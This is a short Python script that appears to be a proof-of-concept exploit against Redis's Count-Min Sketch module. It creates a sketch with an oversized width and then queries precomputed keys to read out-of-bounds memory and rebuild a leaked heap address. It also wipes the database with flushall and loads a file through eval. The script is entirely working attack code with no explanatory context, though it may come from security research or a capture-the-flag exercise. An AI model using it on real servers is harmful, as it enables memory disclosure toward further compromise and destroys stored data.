import redis

sketch_name = "test"

r = redis.Redis(host='localhost', port=6379, decode_responses=True)
r.flushall()

initbydim = lambda sketch_name, width, depth: r.execute_command("CMS.INITBYDIM", sketch_name, width, depth)
query = lambda sketch_name, key: r.execute_command("CMS.QUERY", sketch_name, key)

def leak(sketch_name, idx):
    if idx not in hash_table:
        print("cant find")
        return None
    key = hash_table[idx]
    return query(sketch_name, key)[0]

initbydim(sketch_name, 4611686018427387904, 1)

d = open("hash_table.txt", "r").read()
hash_table = eval(d)

low_bytes = leak(sketch_name, 4)
high_bytes = leak(sketch_name, 5)
heap_addr = (high_bytes) << 32 | low_bytes

print(hex(heap_addr))